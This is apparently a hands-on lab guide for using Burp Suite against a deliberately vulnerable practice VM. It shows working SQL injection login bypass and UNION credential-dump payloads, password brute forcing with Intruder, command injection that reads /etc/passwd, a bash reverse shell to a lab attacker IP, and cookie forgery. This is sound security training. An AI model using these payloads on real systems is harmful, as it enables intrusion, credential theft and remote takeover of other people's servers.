# Lab: Burp Suite Hands-On

## Objective

Learn to use Burp Suite to intercept, modify, and replay HTTP requests against the vulnerable web apps on your Debian VM. This lab builds on the Web Attack Range lab — set that up first if you haven't.

## Prerequisites

- Web Attack Range lab set up on Debian (192.168.244.132)
- Burp Suite running on Kali (pre-installed)
- Firefox on Kali configured to proxy through Burp

---

## Setup: Configure Burp as Your Proxy

### Start Burp Suite

```
Applications → Web Application Analysis → Burp Suite Community Edition
(or just type: burpsuite in terminal)

Select "Temporary project" → "Use Burp defaults" → Start
```

### Configure Firefox to use Burp

```
Firefox → Settings → search "proxy" → Settings
Select: Manual proxy configuration
  HTTP Proxy:  127.0.0.1    Port: 8080
  Check: "Also use this proxy for HTTPS"
Click OK
```

### Install Burp's CA certificate (for HTTPS)

```
1. With proxy configured, browse to: http://burp
2. Click "CA Certificate" to download it
3. Firefox → Settings → search "certificates" → View Certificates
4. Authorities tab → Import → select the downloaded certificate
5. Check both trust boxes → OK
```

### Verify it works

Browse to `http://192.168.244.132` in Firefox. In Burp, go to **Proxy → HTTP history** — you should see the request listed. If you see it, Burp is intercepting traffic.

---

## Exercise 1: Intercept and Modify a Login Request

### Turn on interception

In Burp: **Proxy → Intercept → toggle "Intercept is on"**

### Submit a login

In Firefox, browse to `http://192.168.244.132/sqli/login.php`. Enter:
```
Username: admin
Password: wrongpassword
```

Click Login. The request gets caught by Burp instead of going to the server.

### Examine the request

Burp shows you the raw HTTP request:

```
POST /sqli/login.php HTTP/1.1
Host: 192.168.244.132
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Cookie: PHPSESSID=abc123

user=admin&pass=wrongpassword
```

**What each part means:**

```
POST /sqli/login.php    — the method and path
Host: 192.168.244.132   — the target server
Content-Type: ...        — the data format (URL-encoded form)
Cookie: PHPSESSID=...    — your session identifier

user=admin&pass=wrongpassword  — the actual form data (the body)
```

### Modify the request to inject SQL

Change the body from:
```
user=admin&pass=wrongpassword
```
To:
```
user=admin'--&pass=anything
```

Click **Forward**. The modified request goes to the server. Check Firefox — you should be logged in as admin because the SQL injection bypassed the password check.

### What just happened

The server received `admin'--` as the username. The query became:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

The `'--` closed the username quote and commented out the password check. The server found admin in the database and logged you in.

---

## Exercise 2: Use Repeater for SQLi Testing

### Send a request to Repeater

1. Turn off Intercept (toggle "Intercept is off")
2. In Burp: **Proxy → HTTP history**
3. Find the GET request to `http://192.168.244.132/sqli/search.php?id=1`
4. Right-click it → **Send to Repeater** (or Ctrl+R)

### Test injection payloads

Go to the **Repeater** tab. You see the request on the left. Click **Send** — the response appears on the right.

**Test 1: Normal request**

```
GET /sqli/search.php?id=1 HTTP/1.1
```

Click Send. Response shows a user.

**Test 2: Add a single quote**

Change `id=1` to `id=1'` in the request. Click Send.

Response shows a SQL error — injection confirmed.

**Test 3: Find column count**

```
id=1 ORDER BY 1     → Send → works
id=1 ORDER BY 2     → Send → works
id=1 ORDER BY 3     → Send → works
id=1 ORDER BY 4     → Send → error (only 3 columns)
```

**Test 4: UNION injection**

```
id=-1 UNION SELECT 1,2,3
```

Send. The response shows numbers where data fields are — those are your injectable positions.

**Test 5: Extract data**

```
id=-1 UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users
```

Send. The response contains all usernames and passwords.

### Why Repeater is better than curl for this

- You see the request AND response side by side
- You can modify one parameter and resend instantly
- History of previous attempts is visible
- You can compare responses (did the output change?)
- No URL encoding issues (Burp handles it automatically)

---

## Exercise 3: Use Intruder for Brute Forcing

### Send a login request to Intruder

1. In HTTP history, find the POST to `/sqli/login.php`
2. Right-click → **Send to Intruder** (Ctrl+I)

### Configure the attack

Go to the **Intruder** tab.

**Positions tab:**
Burp highlights parameters it detected. Clear all markers, then select ONLY the password value and click "Add §":

```
user=admin&pass=§wrongpassword§
```

The `§` markers tell Intruder what to replace. Everything between them gets swapped with values from your wordlist.

**Payloads tab:**
- Payload type: Simple list
- Load a wordlist: click "Load" and select `/usr/share/seclists/Passwords/Common-Credentials/top-100.txt`

**Start the attack:**
Click "Start attack" (top right).

### Read the results

Intruder sends one request per password. The results table shows:

```
Payload          Status  Length
-------          ------  ------
password         200     1543
123456           200     1543
admin            200     1543
...
SuperSecretAdmin! 200     1687   ← different length!
```

**What to look for:** A response with a different **length** or different **status code** than the others. Most failed logins return the same response (same length). A successful login returns a different page (different length).

The password with a different response length is the valid one.

**Note:** Burp Community Edition throttles Intruder (one request per second). It's slow for large wordlists. For real brute forcing, use Hydra. Intruder is best for small, targeted attacks.

---

## Exercise 4: Intercept and Test Command Injection

### Browse to the diagnostic tool

With Intercept off, go to `http://192.168.244.132/cmdi/?target=127.0.0.1` in Firefox.

Find the request in HTTP history. Send to Repeater.

### Test injection payloads in Repeater

```
target=127.0.0.1                    → normal ping output
target=127.0.0.1;id                 → ping output + "uid=33(www-data)"
target=127.0.0.1|whoami             → "www-data"
target=127.0.0.1;cat /etc/passwd    → full passwd file
```

### Use Burp to trigger a reverse shell

In Repeater, change the target parameter to:

```
target=127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.244.129/4444 0>&1'
```

**Before sending:** start your listener on Kali: `nc -lvnp 4444`

Click Send in Burp. Check your listener — shell should arrive.

**Why Burp is useful here:** The browser might mangle special characters. Burp sends the request exactly as you type it, giving you more control.

---

## Exercise 5: Discover Hidden Parameters

### Use Burp's built-in content discovery

Sometimes web apps have hidden parameters not visible in the HTML. Burp can find them.

**Manual method — modify requests in Repeater:**

```
Original: GET /sqli/search.php?id=1
Try:      GET /sqli/search.php?id=1&debug=true
Try:      GET /sqli/search.php?id=1&admin=1
Try:      GET /sqli/search.php?id=1&test=1
Try:      GET /sqli/search.php?id=1&source=1
```

Some applications respond differently when you add hidden parameters like `debug=true` or `admin=1`.

---

## Exercise 6: Cookie Manipulation

### Examine cookies

In HTTP history, look at the `Cookie` header in any request:

```
Cookie: PHPSESSID=abc123def456
```

This session cookie identifies you to the server. If you steal someone else's cookie, you become them.

### Test cookie values

In Repeater, try modifying the cookie:

```
Cookie: PHPSESSID=admin
Cookie: role=admin
Cookie: user=admin
Cookie: auth=1
```

Poorly coded applications might trust cookie values without verification.

### Decode cookies

Some cookies are base64 encoded:

```
Cookie: session=YWRtaW46dHJ1ZQ==
```

In Burp: **Decoder tab** → paste the value → select "Base64" → click Decode:

```
admin:true
```

Change it to `admin:false` or another user, re-encode, and send the modified cookie.

---

## Burp Suite Workflow Summary

```
1. BROWSE with Burp proxying — build the site map automatically
2. REVIEW HTTP history — look at every request, every parameter
3. REPEATER for manual testing — send a request, modify, resend
4. INTRUDER for automated attacks — brute force, fuzzing
5. DECODER for encoding/decoding — base64, URL encoding, hex
```

### Keyboard shortcuts

```
Ctrl+R    Send to Repeater
Ctrl+I    Send to Intruder
Ctrl+U    URL-encode selected text (in Repeater/Intruder)
Ctrl+Shift+U    URL-decode selected text
```

---

## When to Use Burp vs curl vs Browser

```
BURP:
  - Testing injection payloads iteratively (Repeater)
  - Modifying hidden form fields or cookies
  - Brute forcing with small wordlists (Intruder)
  - Examining full request/response details
  - When you need to see headers, cookies, and body together

CURL:
  - Quick one-off requests
  - Scripting and automation
  - When you need command-line output for documentation
  - When Burp is overkill for a simple GET/POST

BROWSER:
  - Initial exploration of a web app
  - When you need to interact with JavaScript
  - When the app requires complex authentication flows
  - When you just need to see what the page looks like
```
